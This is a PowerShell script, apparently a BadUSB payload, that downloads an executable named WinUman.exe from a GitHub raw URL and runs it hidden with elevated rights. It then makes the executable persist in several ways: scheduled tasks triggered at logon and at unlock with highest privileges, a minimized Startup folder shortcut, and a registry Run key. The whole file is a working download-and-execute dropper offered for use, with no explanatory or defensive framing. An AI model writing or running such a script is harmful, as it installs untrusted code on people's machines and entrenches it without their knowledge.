# Variables
$exeUrl = "https://raw.githubusercontent.com/the-shadow-walker/bad-usb-flipper-payloads/main/EXE/WinUman.exe"
$exePath = "$env:APPDATA\WinUman.exe"
$shortcutName = "WinUman.lnk"
$shortcutPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$shortcutName"
$scheduledTaskName = "WinUmanResilient"
$unlockTaskName = "WinUmanUnlock"

# --- 1. Download EXE ---
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing

# --- 2. Run EXE hidden with admin ---
Start-Process -FilePath $exePath -Verb RunAs -WindowStyle Hidden

# --- 3. Create Scheduled Task for Logon with Resilience Settings ---
# Clean up any old version
schtasks /Delete /TN $scheduledTaskName /F > $null 2>&1

# Use schtasks for 100% compatibility
schtasks /Create /F /TN $scheduledTaskName /TR "`"$exePath`"" /SC ONLOGON /RL HIGHEST /RU "$env:USERNAME"

# --- 4. Create Scheduled Task for Unlock Trigger ---
schtasks /Delete /TN $unlockTaskName /F > $null 2>&1
schtasks /Create /F /TN $unlockTaskName /TR "`"$exePath`"" /SC ONUNLOCK /RL HIGHEST /RU "$env:USERNAME"

# --- 5. Create Startup Folder Shortcut as Fallback ---
$WshShell = New-Object -ComObject WScript.Shell
$shortcut = $WshShell.CreateShortcut($shortcutPath)
$shortcut.TargetPath = $exePath
$shortcut.WorkingDirectory = Split-Path $exePath
$shortcut.WindowStyle = 7 # Minimized window
$shortcut.Description = "WinUman Startup Shortcut"
$shortcut.Save()

# --- 6. Add Registry Run Key Fallback ---
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WinUman" -Value $exePath

Write-Host "✅ Installation and persistence setup complete."
